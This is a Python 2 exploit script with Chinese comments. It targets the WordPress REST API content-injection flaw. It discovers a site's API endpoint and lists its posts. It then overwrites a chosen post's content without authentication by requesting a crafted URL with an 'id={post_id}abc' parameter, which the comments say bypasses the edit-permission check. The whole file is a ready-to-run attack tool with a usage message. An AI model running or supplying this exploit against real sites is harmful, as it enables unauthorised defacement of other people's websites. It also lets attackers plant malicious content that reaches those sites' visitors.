#coding=UTF-8

import json
import sys
import urllib2

from lxml import etree


def get_api_url(wordpress_url): #检测和修改用户输入的URL
    response = urllib2.urlopen(wordpress_url)

    data = etree.HTML(response.read())
    u = data.xpath('//link[@rel="https://api.w.org/"]/@href')[0]

    #查看是否有permalinks插件
    if 'rest_route' in u:
        print(' ! Warning, looks like permalinks are not enabled. This might not work!')

    return u


def get_posts(api_base):    #获取指定URL上的所有posts（wordpress文章）
    respone = urllib2.urlopen(api_base + 'wp/v2/posts') #url = '*/wp-json/wp/v2/posts'
    posts = json.loads(respone.read())  #以json格式分析返回数据

    for post in posts:  #遍历显示每一条wordpress文章的id，title，renderd，link
        print(' - Post ID: {0}, Title: {1}, Url: {2}'.format(post['id'], post['title']['rendered'], post['link']))


def update_post(api_base, post_id, post_content):
    # more than just the content field can be updated. see the api docs here:
    # https://developer.wordpress.org/rest-api/reference/posts/#update-a-post
    data = json.dumps({ #data为json格式的content里的内容
        'content': post_content
    })

    #此处构造恶意url，漏洞点为id={post_id}abc，加入abc可以绕过修改文章的权限
    url = api_base + 'wp/v2/posts/{post_id}/?id={post_id}abc'.format(post_id=post_id)

    content_type = 'application/json'
    user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
    headers = { 'Content-Type' : content_type,
                'User-Agent': user_agent}

    req = urllib2.Request(url, data, headers)
    response = urllib2.urlopen(req).read()

    print('* Post updated. Check it out at {0}'.format(json.loads(response)['link']))


def print_usage():  #打印exp用法
    print('Usage: {0} <url> (optional: <post_id> <file with post_content>)'.format(__file__))


if __name__ == '__main__':

    #检查至少有参数URL
    if len(sys.argv) < 2:
        print_usage()
        sys.exit(1)

    #若用户提供了id，那么就必须提供content
    if 2 < len(sys.argv) < 4:
        print('Please provide a file with post content with a post id')
        print_usage()
        sys.exit(1)

    print('* Discovering API Endpoint')
    api_url = get_api_url(sys.argv[1])  #检查URL，并加上路径/wp-json/
    print('* API lives at: {0}'.format(api_url))

    #若用户只输入了URL，则获取所有可用的posts（wordpress文章）
    if len(sys.argv) < 3:
        print('* Getting available posts')
        get_posts(api_url)

        sys.exit(0)

    # if we get here, we have what we need to update a post!
    print('* Updating post {0}'.format(sys.argv[2]))
    with open(sys.argv[3], 'r') as content: #读取content文件
        new_content = content.readlines()

    update_post(api_url, sys.argv[2], ''.join(new_content))

    print('* Update complete!')
